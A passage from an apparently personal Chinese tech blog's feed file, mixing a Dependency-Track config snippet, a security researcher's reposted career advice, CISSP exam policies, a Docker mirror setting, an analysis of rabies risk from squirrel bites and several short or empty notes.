class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">- <span class="hljs-attribute">API_BASE_URL</span>=http://localhost:8081<br></code></pre></td></tr></table></figure><p>localhost 修改为本机地址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">- <span class="hljs-attribute">API_BASE_URL</span>=http://10.217.11.149:8081<br></code></pre></td></tr></table></figure><p><a href="https://owasp.org/www-project-dependency-track/">https://owasp.org/www-project-dependency-track/</a></p><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】基于开源工具实现软件成分分析SCA <a href="https://xz.aliyun.com/u/44309"><strong>myc</strong></a> &#x2F; 2022-07-05 </p><p><a href="https://xz.aliyun.com/t/11492?time__1311=Cq0xRDnD070QKGNPeeuAxjOGrSFkLbD">https://xz.aliyun.com/t/11492?time__1311=Cq0xRDnD070QKGNPeeuAxjOGrSFkLbD</a></p><p>【2】基于DependencyTrack实现第三方组件管理 该用户已注销-0189 2021-09-04 12:08:17</p><p><a href="https://www.freebuf.com/articles/network/287486.html">https://www.freebuf.com/articles/network/287486.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>codesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>codesec</tag>
      
      <tag>devsecops</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tk_wb_blog_study</title>
    <link href="/2025/01/12/informationCocoon/tk_wb_blog_study/"/>
    <url>/2025/01/12/informationCocoon/tk_wb_blog_study/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="2020-8-16-工作并不意味着学习的结束，而是另一个开始"><a href="#2020-8-16-工作并不意味着学习的结束，而是另一个开始" class="headerlink" title="2020-8-16-工作并不意味着学习的结束，而是另一个开始"></a>2020-8-16-工作并不意味着学习的结束，而是另一个开始</h2><p><strong>工作并不意味着学习的结束，而是另一个开始。我们大多数人至少都要工作三十年，这三十年里还会有很多东西要学。所以不用太在意之前学了什么，更重要的是看你还能学会什么。无论之前学过什么，将来都要再学新东西。无论之前学的是什么，将来也都会有用。艺无止境，功不唐捐。</strong></p><p>【一个女生怎样才能进入腾讯的玄武实验室？】<br>『本人是一位热爱网络安全技术的女生，大二开始接触网络安全，因为热爱，大部分时间都在自学网络安全方面的知识技能，有学习主动信息收集，被动信息收集，无线攻击，密码破解，web渗透,metasploit,linux等渗透测试所需技能，正学习python。不断地学习中发现，可能因为网络安全涉及面较广，所以需要掌握的知识较多但不深，而心中有大牛的目标，向往玄武这种顶级的国内安全研究实验室，查看各种资料发现玄武对技术的要求非常专一且深入，再加上玄武好像只有一位女生，有些迷茫不知朝哪个方向努力，才能离玄武更近一步。』</p><p>很多人以为我是专门研究二进制安全的，所以偏向二进制方向。其实去年发现的 BadTunnel 就不属于二进制方向：《BadTunnel：跨网段劫持广播协议》<a href="https://weibo.cn/sinaurl?u=http://mp.weixin.qq.com/s?__biz=MzA5NDYyNDI0MA==&mid=2651953600&idx=1&sn=7779613d4886c7739a9bbf076b7195f9&scene=0"><img src="https://h5.sinaimg.cn/upload/2015/09/25/3/timeline_card_small_web_default.png" alt="img">BadTunnel：跨网段劫持广播协议</a>。你上面提到的东西，我基本也都搞过。</p><p>这是很早以前一份简历里的内容：</p><p>• 2002年1月，发现了CheckPoint MetaInfo Sendmail管理接口执行命令漏洞。<br>• 2002年1月，发现了Snitz Forums 2000 Version 3.1 SR4的管理界面认证绕过漏洞。<br>• 2002年4月，和一个朋友共同发现了PhpBB等多个论坛程序的BBCode函数拒绝服务漏洞（bugtraq ID 4432、4434）</p><p>前几年研究浏览器的二进制漏洞时也同时研究过 Web 前端相关的问题：《浏览器和本地域》<a href="https://weibo.cn/sinaurl?u=http://hitcon.org/2013/download/%5BI1%5D%20Tombkeeper%20-%20%E7%80%8F%E8%A6%BD%E5%99%A8%E5%92%8C%E6%9C%AC%E5%9C%B0%E5%9F%9F_HITCon2013.pdf"><img src="/timeline_card_small_web_default.png" alt="img">网页链接</a></p><p>你说的无线攻击我也研究过：《来自空中的威胁》<a href="https://weibo.cn/sinaurl?u=http://www.cert.org.cn/upload/cncertcc06/0330/ct1/5.060330-YuYang-ThreatsFromAir.pdf"><img src="/timeline_card_small_web_default.png" alt="img">网页链接</a></p><p>渗透测试做的就更多了。以前在乙方公司，我是渗透测试主力。还记得最忙的一个项目，我和部门领导一起，两个月做了 184 台服务器的渗透测试。</p><p>所以我可能是最不会对各类安全技术有偏见的人。</p><p>无论哪类技术，背后的需要的东西都是类似的。AFL 这个革命性的二进制漏洞 Fuzz 工具的作者，也是《The Tangled Web: A Guide to Securing Modern Web Applications》这本 Web 安全圣经的作者。</p><p>我们实验室有几个做 Windows 方向的同学， 毕业前都没接触过 Windows 安全。但在实验室工作半年后，就开始能做出一些成果。一年多之后，就已经能做出很不错的东西。当然，这并不意味着干这行很容易，人人可为。这几位同学虽然之前没接触过 Windows 安全，但在校期间，在其它方向上都做出了一些东西。我记得其中一个同学，毕业前硬啃了几个月 Apache 源码，发现了一个漏洞。在 Apache 里还能搞出东西来，是不容易的。</p><p>工作并不意味着学习的结束，而是另一个开始。我们大多数人至少都要工作三十年，这三十年里还会有很多东西要学。所以不用太在意之前学了什么，更重要的是看你还能学会什么。无论之前学过什么，将来都要再学新东西。无论之前学的是什么，将来也都会有用。艺无止境，功不唐捐。</p><p><img src="/image-20250112222253303.png" alt="image-20250112222253303"></p><p><img src="/image-20250112222312035.png" alt="image-20250112222312035"></p><p><a href="https://weibo.com/1401527553/Jg8YtA5j2">https://weibo.com/1401527553/Jg8YtA5j2</a></p><h2 id="2020-12-9-如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进"><a href="#2020-12-9-如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进" class="headerlink" title="2020-12-9-如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进"></a>2020-12-9-如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进</h2><p>我刚参加工作的时候，做了很长一段时间“低级”“无意义”的工作。就是给 IDS 加一些针对古老攻击工具的规则。</p><p>那些木马和漏洞有些甚至古老到连运行环境都不好找了。所以加那些规则对检测能力来说确实没有意义，永远都不会发挥作用。但竞争对手有这个规则你就也得有。你看，其实连网络安全产品也是“内卷”的。</p><p>工作的步骤就是搜索、下载、运行、抓包、看特征、写规则。然后再重复，再重复，重复很多遍。有时候为了应付一个投标前的测评，每天要加接近一百条规则。就这么重复，干到十一二点。</p><p>但通过做这些重复的、“低级”的、“无意义”的工作，我熟悉了各类漏洞的原理，学会了很多分析工具的使用，熟悉了大量通用的和私有的网络协议，看到了各种系统可能出问题的地方。如果 2002 年没有做过这些“低级”“无意义”的工作，我大概也不会对网络协议有那么深刻的理解，不会在 2016 年发现 BadTunnel 漏洞。</p><p>当然，如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进。对这类人来说，工作确实只是消耗过程，而不能成为增益过程。</p><p><img src="/image-20250112222038445.png" alt="image-20250112222038445"></p><p><a href="https://weibo.com/1401527553/JxH3KzkYg">https://weibo.com/1401527553/JxH3KzkYg</a></p><h2 id="2023-10-29-零基础变成一基础，再变成二基础，再变成三基础"><a href="#2023-10-29-零基础变成一基础，再变成二基础，再变成三基础" class="headerlink" title="2023-10-29-零基础变成一基础，再变成二基础，再变成三基础"></a>2023-10-29-零基础变成一基础，再变成二基础，再变成三基础</h2><p>大约十年前，我回答过一个“零基础如何学习挖漏洞”的问题。我说我是先从看漏洞公告开始，入门阶段至少看了两三千条历史漏洞。还要看漏洞分析文档，在看的过程中学习调试和汇编。</p><p>在我当年的那条回答下面，时任 360 技术总裁的谭晓生说他当年自学技术是从逆向研究老的 DOS 病毒开始，还逆向了 WPS，并自己模仿写了一个；后来创办了微步在线的薛峰评论说他当年也是从看漏洞公告开始，翻遍了漏洞库里所有的老漏洞。</p><p>“零基础如何学XXX”这类问题很常见，答案都是一样的：先把零基础变成一基础，再变成二基础，再变成三基础。谁不是从零基础开始的呢？强调“零基础”，潜台词就是不愿付出入门的功夫，希望有神奇的办法能跳过打基础的阶段。这种事情在武侠小说里有，在现实中是没有的。</p><p><img src="/image-20250112213555282.png" alt="image-20250112213555282"></p><p><a href="https://weibo.com/1401527553/Nq7WAtobo">https://weibo.com/1401527553/Nq7WAtobo</a></p><h2 id="24-3-15-只要稍微努力一点，只要开始行动，别停下"><a href="#24-3-15-只要稍微努力一点，只要开始行动，别停下" class="headerlink" title="24-3-15-只要稍微努力一点，只要开始行动，别停下"></a>24-3-15-只要稍微努力一点，只要开始行动，别停下</h2><p>昨天那个学外语的 APP 告诉我：我的学习经验值超过了大部分使用这个 APP 的人——但我其实没学多久。</p><p>所以我一直告诉大家：你只要稍微努力一点，只要开始行动，别停下，无论快慢，就会比大部分人都强了。 </p><p><img src="/image-20250112213226026.png" alt="image-20250112213226026"></p><p><a href="https://weibo.com/6827625527/O56cxi36M">https://weibo.com/6827625527/O56cxi36M</a></p><h2 id="2022-1-18-文档学习法"><a href="#2022-1-18-文档学习法" class="headerlink" title="2022-1-18-文档学习法"></a>2022-1-18-文档学习法</h2><p>一、先把Windows的帮助文件从头到尾看一遍。</p><p>二、在Windows目录下搜索*.txt、*.htm?、*.log、*.ini，把每一个文件内容都看一遍。</p><p>三、把注册表浏览一遍。</p><p>不少人听说我曾靠“看帮助文件”学技术，于是也跑去看。结果发现自己看不下去，又来问我这是怎么回事。</p><p>下面这篇是所谓“看帮助文件”那个说法的出处。完整看一下就明白了——我当时说的恰恰就是大部分人都看不下去。看不下去没关系，可以找点别的事情做。</p><p>写于2005年10月2日</p><p>2005.10.02</p><p>这两天论坛上又有人开始抱怨世风日下，大家都现实了，都不开放了，不交流了。对这种“月经贴”，我基本上已经习惯了，不过因为吃了粉皮炖鸡，心情比较好，于是就说了两句。</p><p>三四年前，当时我对人性的看法还不像现在这样。有几个人加了我的QQ，说想学Windows，我居然就好为人师起来，自不量力地教人学Windows。我很天真地把自己的经验告诉他们：</p><p>一、先把Windows的帮助文件从头到尾看一遍。</p><p>二、在Windows目录下搜索*.txt、*.htm?、*.log、*.ini，把每一个文件内容都看一遍。</p><p>三、把注册表浏览一遍。</p><p>没有诀窍，也不用花钱买书。任何人把这三步做完之后，只要不是傻子，在Windows应用方面都可以非常熟练。并且如果想进一步学，也自然知道应该去看什么了。</p><p>结果甚至没有一个人能看完Windows帮助文件，看完三分之一的都没有，都说看不下去。我很奇怪，我看Windows的帮助文件就像看金庸小说一样愉快，怎么会有人觉得辛苦？</p><p>后来我想明白了：因为我爱她，而他们不爱她，只是想占有她而已。</p><p>他们要的不是交流，不是开放，甚至也不是想找个人“拜师”，他们想要的不是郭靖遇到的洪七公，而是虚竹遇到的无涯子。</p><p>再后来，一个偶然的机会，我看到了小四同学写的那篇《你尽力了么？》，才知道原来这不只是我一个人的看法。</p><p>这两天在家，在笔记本上折腾Linux，遇到了很多问题，我就把内核每一个编译选项的说明都细细看了一遍，反复编译上二十多遍——然后，所有问题的答案都找到了。显然，学Linux和学Windows的方法并没有什么不同。</p><p><a href="https://weibo.com/1401527553/LbklKyE0j">https://weibo.com/1401527553/LbklKyE0j</a></p><h2 id="2024-4-24-学会做事"><a href="#2024-4-24-学会做事" class="headerlink" title="2024-4-24-学会做事"></a>2024-4-24-学会做事</h2><p>中国每年大概有五百万理工科毕业生。其中堪称优秀技术人才的自然是少数。然而，技术好又会做事的更是极少数。</p><p>什么是“做事”？就是确立目标、分析路径、规划资源、制定方案、迭代执行。优秀技术人才，自然是能把技术做好的人。但从做技术到做事，中间还有很远的距离。大部分人可能终其一生都不会做事。</p><p>前阵子一个同学跟我说想去 BlackHat 演讲。我说你是怎么规划这件事的？他一愣，半天说不出话。他定了目标，但没去想后面的事情。</p><p>然后我问他有没有注意到 BlackHat 有些演讲水平很高，但也有一些不太行的。他说确实是这样。然后我说你有没有分析过为什么会这样？他说没有。我说如果你分析一下那些不太行的演讲为什么也能上 BlackHat，是不是会对你达成目标有帮助？他恍然大悟。</p><p>我说这只是一个小点，还不算完。你知道怎么才能上 BlackHat？他想了一下说是投稿被接受。我说那么是不是应该收集既往演讲的内容摘要，分析被接受的投稿有什么特点。</p><p>然后我说你有没有想过 Blackhat 演讲者和主办方之间是什么关系？他说不知道。我说本质是商业合作关系。主办方给演讲者提供曝光机会和机票酒店，演讲者用自己的内容帮主办方把票卖出去。所以投稿要让别人看了觉得是有利于卖票的。</p><p>我又问你有没有想过 Review Board 里的人是怎么挑选演讲的？有没有想过如果你在  Review Board 你会看重哪些？有没有了解过 Review Board 里的那些人？其中和你技术方向相关的人有哪些？这些人历史上做过什么？他们可能会对哪些东西更青睐？</p><p>说了这么多，还只是分析路径这一步。后面规划资源、制定方案、迭代执行都还需要更多的思考。当然，这个同学刚毕业，不会做事很正常，后面还有时间慢慢学。但如果你毕业已经很久了，发现自己还不会做事，就要开始留心培养这方面的能力了。在学校里我们的成长主要靠学习知识。毕业后，更重要的成长是学会做事。</p><p><a href="https://weibo.com/6827625527/ObcUX0JMY">https://weibo.com/6827625527/ObcUX0JMY</a></p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>tk</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>tk</tag>
      
      <tag>成长建议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/01/07/informationCocoon/tk_group_message/2025/"/>
    <url>/2025/01/07/informationCocoon/tk_group_message/2025/</url>
    
    <content type="html"><![CDATA[<p>有效努力是做对的事的范畴，高效能努力是怎么把事做对的范畴，先有效再高效</p><p><img src="/2025/image-20250107190307395.png" alt="image-20250107190307395"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cissp-sc2</title>
    <link href="/2025/01/04/security/seccert/cissp/cissp-sc2/"/>
    <url>/2025/01/04/security/seccert/cissp/cissp-sc2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="SC2-政策"><a href="#SC2-政策" class="headerlink" title="SC2 政策"></a>SC2 政策</h2><h3 id="准考规定"><a href="#准考规定" class="headerlink" title="准考规定"></a>准考规定</h3><p>计划在考试开始时间前至少 <strong>30 分钟</strong>到达您的考试中心。要办理预约登记手续，<strong>需要</strong>满足以下条件：出示<strong>两 （2） 份</strong>有效且未过期的个人身份证件（示例包括：政府签发的身份证件、护照等）。两者都必须有您的姓名（与考试报名中显示的姓名完全一致）和签名，其中之一必须有您的照片。有关可接受 ID 的更多信息，请访问：<a href="https://www.isc2.org/Exams/Exam-Day%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8">https://www.isc2.org/Exams/Exam-Day，然后在</a> What You Need to Bring to the Test Center 选项卡下了解更多信息。<br><strong>不可接受的身份证件形式：</strong> <strong>数字身份证</strong>（数字身份证是个人身份信息的电子表示形式，可用于验证个人身份）有关 Aadhaar ID 的更多信息，请访问<a href="https://www.pearsonvue.com/content/dam/VUE/vue/global/documents/global-id-policy/Pearson-VUE-Aadhaar-ID-Policy-English.pdf">Pearson VUE 的 Aadhaar ID 政策</a>.18 岁以下的未成年人 – 未成年人必须在考试当天由父母或监护人陪同。请参阅未成年人的身份证件要求，<a href="https://www.isc2.org/exams/exam-day">https://www.isc2.org/exams/exam-day</a> 提供您的签名。提交到<a href="https://www.isc2.org/-/media/ISC2/Documents/palm-vein_candidate-isc2.ashx?la=en&hash=A575A664E77B78B6BB2708413EFB6C7913645C08">手掌静脉扫描</a>（除非法律明确禁止）。拍下你的照片。照片中不得佩戴帽子、围巾和外套。此外，您不得在考场内佩戴这些物品。请将您的个人物品留在考场外。您将可以访问安全存储。由于存储空间有限，请适当规划。Pearson VUE 考试中心不对您的个人物品负责。接收来自测试管理员 （TA） 的简短介绍。入职培训结束后，TA 将护送您前往检测站。签署并同意<a href="https://www.isc2.org/Exams/Non-Disclosure-Agreement">保密协议</a>这将在您的考试开始时提供。请花点时间立即查看协议，以便您在参加考试时熟悉它。如果考试主办方选择，您同意 Pearson VUE 将在考试当天在考试中心收集您的手掌静脉模式，并在法律允许的范围内保留该信息。您的手掌静脉扫描将用于考试当天和未来考试日的身份验证，检测和防止任何欺诈行为，并维护考试计划的安全性和完整性。有关 Pearson VUE 个人数据（包括手掌静脉扫描等生物识别数据）使用和保留政策的更多信息，请参阅我们的<a href="https://wsr.pearsonvue.com/privacy">隐私和 Cookie 政策</a>.您同意这些测试政策包括同意隐私和 Cookie 政策。</p><h3 id="考试改期规定"><a href="#考试改期规定" class="headerlink" title="考试改期规定"></a>考试改期规定</h3><p>如果您想重新安排考试预约，您必须联系<a href="https://home.pearsonvue.com/contact">皮尔逊 VUE</a>.如果您选择<strong>在线重新安排</strong>预约，您必须<strong>至少在预约前 48 小时</strong>进行。如果您选择<strong>致电 Pearson 客户支持团队重新安排</strong>时间，则必须至少<strong>在预约前 24 小时</strong>这样做。重新安排考试预约需要支付 50 美元的费用。如上所述，在没有适当提前通知的情况下重新安排考试预约将导致缺席并没收所有考试和重新安排费用。安排后，您最多有 365 天的时间参加考试。未能在 365 天内参加考试将导致缺席并没收所有考试和重新安排费用。</p><h3 id="考试取消规定"><a href="#考试取消规定" class="headerlink" title="考试取消规定"></a>考试取消规定</h3><p>如果您想取消考试预约，您必须联系<a href="https://home.pearsonvue.com/contact">皮尔逊 VUE</a>.如果您选择<strong>在线取消</strong>预约，您必须<strong>至少在预约前 48 小时</strong>进行。如果您选择<strong>致电 Pearson 客户支持团队取消</strong>，则必须至少<strong>在预约前 24 小时</strong>进行取消。取消考试预约需要支付 100 USD 的费用。如上所述，在没有适当提前通知的情况下取消考试预约将导致缺席并没收所有考试和重新安排费用。</p><h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p><strong>ISC2 条款和条件</strong>ISC2 要求所有认证考生阅读并接受此处规定的条款和条件：<a href="https://www.isc2.org/uploadedFiles/Certification_Programs/CBT-Examination-Agreement.pdf">https://www.isc2.org/uploadedFiles/Certification_Programs&#x2F;CBT-Examination-Agreement.pdf。</a>不同意条款和条件的考生将不被允许参加任何 ISC2 考试。<strong>保密协议 （NDA）</strong>未能在规定的 5 分钟内阅读或接受 ISC2 NDA 协议将导致考试终止并丧失考试预约。没收考试预约也包括没收所有考试费用。要在以后参加考试，您将需要重新报名参加考试并支付所有适用的注册费。<strong>有关 ISC2 考试的重要信息</strong>通过机考参加考试的考生的好处之一是，大多数考生在完成考试后立即收到分数。在某些情况下，ISC2 必须在发布考试结果之前进行定期心理测量分析。对于受此流程影响的少数考生，预计考生将在考试后 6 -8 周内收到成绩。ISC2 提供两种类型的基于计算机的考试——线性和自适应——但是这两种考试类型都不允许考生跳过一个项目，也不能在管理期间稍后返回项目。答案一旦确认，就无法更改、审查或重新访问。常见问题（FAQ）和常见查询的解答可在此处找到：<a href="https://www.isc2.org/Frequently-Asked-Questions">https://www.isc2.org/Frequently-Asked-Questions</a>.**<br>住宿政策**ISC2 为有考试便利记录的人提供合理和适当的便利。在安排考试之前，必须由 ISC2 申请并批准住宿。如果您想申请住宿，请访问<a href="https://www.isc2.org/Register-for-Exam%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8">https://www.isc2.org/Register-for-Exam，然后在</a> Requesting Special Accommodation（申请特殊便利）选项卡下查看有关如何申请便利的信息和说明。考试便利设施是个性化的，并根据具体情况进行考虑。住宿获得批准后，ISC2 将通知 Pearson VUE 住宿团队。请等待 Pearson VUE 最多三个工作日接收此信息。然后，联系 Pearson VUE，以便您预约考试，联系信息可在<a href="http://www.pearsonvue.com/isc2/contact">www.pearsonvue.com/isc2/contact</a>.便利设施并不能保证成绩提高或考试完成。安排初次考试预约后，可能需要支付 50 美元的费用才能在获得批准的便利设施下重新安排考试。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/01/03/yunwei/applications/Macapplications/brew/brew_error/"/>
    <url>/2025/01/03/yunwei/applications/Macapplications/brew/brew_error/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>流感疫苗</title>
    <link href="/2025/01/02/informationCocoon/medical/%E6%B5%81%E6%84%9F%E7%96%AB%E8%8B%97/"/>
    <url>/2025/01/02/informationCocoon/medical/%E6%B5%81%E6%84%9F%E7%96%AB%E8%8B%97/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="打疫苗时间-9-10月份"><a href="#打疫苗时间-9-10月份" class="headerlink" title="打疫苗时间 9-10月份"></a>打疫苗时间 9-10月份</h3><h3 id="打疫苗种类：肺炎链球菌疫苗"><a href="#打疫苗种类：肺炎链球菌疫苗" class="headerlink" title="打疫苗种类：肺炎链球菌疫苗"></a>打疫苗种类：肺炎链球菌疫苗</h3>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>medical</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>medical</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>waf_attack_tips</title>
    <link href="/2025/01/02/security/netsec/waf/waf_attack_tips/"/>
    <url>/2025/01/02/security/netsec/waf/waf_attack_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
      <category>waf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>attack</tag>
      
      <tag>waf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_registry</title>
    <link href="/2025/01/02/yunwei/applications/docker/docker_registry/"/>
    <url>/2025/01/02/yunwei/applications/docker/docker_registry/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="阿里云镜像源"><a href="#阿里云镜像源" class="headerlink" title="阿里云镜像源"></a>阿里云镜像源</h2><p>“registry-mirrors”: [<br>    “<a href="https://registry.cn-hangzhou.aliyuncs.com/">https://registry.cn-hangzhou.aliyuncs.com</a>“<br>  ]</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>被野生松鼠咬的处理方案</title>
    <link href="/2024/12/30/informationCocoon/medical/%E8%A2%AB%E9%87%8E%E7%94%9F%E6%9D%BE%E9%BC%A0%E5%92%AC%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88/"/>
    <url>/2024/12/30/informationCocoon/medical/%E8%A2%AB%E9%87%8E%E7%94%9F%E6%9D%BE%E9%BC%A0%E5%92%AC%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>尽管暴露于啮齿类动物导致狂犬病的可能性微乎其微，但是面对「野生松鼠」致伤时，一方面仍然应该考虑进行暴露后处置（包括狂犬病、破伤风疫苗接种，以及被动免疫制剂使用），另一方面也应该考虑对致伤动物进行狂犬病毒检测，从而确认感染风险以及在必要情况下调整处置方案。</p><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>#男生手喂公园松鼠被挠伤挨5针花1千# 这个事情的对错可能会比较颠覆既往的一些认知。</p><p>先说一个比较尴尬的事实：虽然被啮齿类动物咬伤后，通常不需要接种狂犬病疫苗，但全世界有两个国家被记录过「松鼠」相关的人类狂犬病案例。</p><p>▌病例1来自印度</p><p>印度特里凡得琅医学学院SAT医院儿科报告了喀拉拉邦一名「过去没有被任何其他动物咬伤的病史」的7岁男孩出现发热、咳嗽、烦躁不安、进食困难以及在喝水时表现出攻击性行为就诊，症状已持续2天。两个月前，患儿右腿曾被松鼠咬伤，并在当地医院接受了破伤风疫苗注射和伤口处理，但「未接种」狂犬病疫苗。</p><p>患儿在重症监护室接受「支持性治疗」，但病情持续恶化，最终在「入院4小时」后因心肺功能衰竭死亡。角膜印片免疫荧光检测结果为狂犬病阳性</p><p>▌病例2来自中国</p><p>我国「中疾控病毒所」的研究显示：2005年至2012年，我国30个省报告了19,221例狂犬病病例，主要发生在中国南部和东部的农村地区，大多与农民、学生和学龄前儿童有关。在对2010年至2011年报告的「死亡病例」的详细分析中发现，这些人类狂犬病病例主要因暴露于狗（93.7%）和猫（4.6%）所致，其余则与其他家畜和野生动物有关，包括马、猪、老鼠和「松鼠」。</p><p>需要注意的是，大多数报告的人类狂犬病病例都是「临床诊断」，而没有经过实验室检测，上述信息基于2010年至2011年疑似人类狂犬病病例的流行病学和暴露后处置的治疗数据。</p><p>▌差点出现的病例3</p><p>根据印度喜马偕尔邦西姆拉卡苏帕提帕里马哈尔州卫生与家庭福利研究所发布的信息，2019年8月10日，「斯里兰卡科伦坡」一名9岁男孩在右手食指中部被松鼠咬伤，但「伤口没有出血」，但有一小块皮肤剥落。医生将其评估为Ⅱ级暴露，并启动「两点皮内（ID）疫苗接种」作为暴露后预防（斯里兰卡这种免疫程序一共要打4次，每次2针皮内注射，可以减少疫苗抗原使用）。</p><p>当天中午「松鼠死亡」，其头部被送往科伦坡斯里兰卡医学研究所的实验室进行狂犬病检测。8月13日，实验室通过荧光抗体试验（FAT）报告（编号H 898，日期13&#x2F;08&#x2F;2019）确认松鼠为「狂犬病毒阳性」！</p><p>孩子的父母「带着报告」再次前往医院与医生会面并沟通接种被动免疫制剂。医生表示，由于伤口表浅且属于Ⅱ级暴露，不需要注射狂犬病免疫球蛋白（RIG），因为RIG可能带来的副作用风险不值得冒。尽管斯里兰卡的医院配备了人用狂犬病免疫球蛋白（HRIG），医生仍认为不应冒过敏反应（如过敏性休克）的风险。因此，在当天即8月13日按计划接种了第二剂皮内疫苗，而「未使用」RIG。</p><p>此后，斯里兰卡的儿童家长给「印度医生」发邮件并得到肯定的回复（需要使用RIG）后，在他们的坚持下给儿童注射了RIG，最终大幅降低了这名9岁儿童的狂犬病发病风险。这一切的结果，来源于家长的坚持和努力。</p><p>▌本次案例分析</p><p>在本次案例中，伤者被野生松鼠攻击后出现手指出血的情况，根据暴露等级属于「Ⅲ级暴露，结合我国对动物狂犬病毒监测水平以及既往在国内出现过疑似暴露于松鼠相关的人类狂犬病病例背景，医院采取狂犬病疫苗接种可以说是「正确」的方案。</p><p>然而有以下几点值得关注：</p><p>②是否使用被动免疫制剂：在面对松鼠所致的暴露时，如果认为需要进行狂犬病疫苗接种，那么按照标准Ⅲ级暴露的处置方式，也应该使用被动免疫制剂（比如免疫球蛋白或单克隆抗体），而新闻提到的数字是「5针和1000元」，那么根据价格计算可能未使用被动免疫制剂；</p><p>②是否属于再次暴露：如果伤者既往因全程接种过狂犬病疫苗而不适用被动免疫制剂，那么就不应该接种5针狂犬病疫苗，而是「2针」，那么如果其余3针是破伤风疫苗的话，价格也不太对；</p><p>③是否进行破伤风暴露后处置：被松鼠致伤后，除了进行狂犬病暴露后处置外，还应该进行「破伤风暴露后处置」，但从接种针次来看似乎也并不成立，也就是可能「没有」进行破伤风暴露后处置。</p><p>当然除了一些疑惑点之外，还是有积极的方面。</p><p>值得表扬的是，视频里云南大学附属医院开具的《狂犬病·破伤风预防处置知情同意书》是一个非常不错的文件，因为很多的狂犬病暴露后处置都应该伴随破伤风暴露后处置，只不过很少被提及，而这个知情同意书做的非常好。</p><p>▌小结</p><p>尽管国家卫健委发布的《常见动物致伤诊疗规范》中提到「啮齿类和免形目动物极少感染狂犬病，目前无导致人类狂犬病病例的证据」，但事实上尽管证据有限且质量不高（印度的没有对动物狂犬病毒感染情况进行检测，中国采用的是病例记录信息而非病毒检测结果），但也提示了《规范》中的表述「并不严谨」。</p><p>综上，尽管暴露于啮齿类动物导致狂犬病的可能性微乎其微，但是面对「野生松鼠」致伤时，一方面仍然应该考虑进行暴露后处置（包括狂犬病、破伤风疫苗接种，以及被动免疫制剂使用），另一方面也应该考虑对致伤动物进行狂犬病毒检测，从而确认感染风险以及在必要情况下调整处置方案。</p><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】</p><p><a href="https://weibo.com/1803648617/5116944095646116">https://weibo.com/1803648617/5116944095646116</a></p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>medical</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>medical</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>movie-巴山夜雨</title>
    <link href="/2024/12/30/informationCocoon/video/movie-%E5%B7%B4%E5%B1%B1%E5%A4%9C%E9%9B%A8/"/>
    <url>/2024/12/30/informationCocoon/video/movie-%E5%B7%B4%E5%B1%B1%E5%A4%9C%E9%9B%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="BIT"><a href="#BIT" class="headerlink" title="BIT"></a>BIT</h2><p>1980 年上影厂的《巴山夜雨》，资源：83d6ffeb8a44949db10342cc90d9eb9705bcf4b3 或 48433828F7E0B79D293954C4B04F3059A8105C03 或 8be60b0b2fd22f8425cf4fabc4edb32042f5b073 。</p>]]></content>
    
    
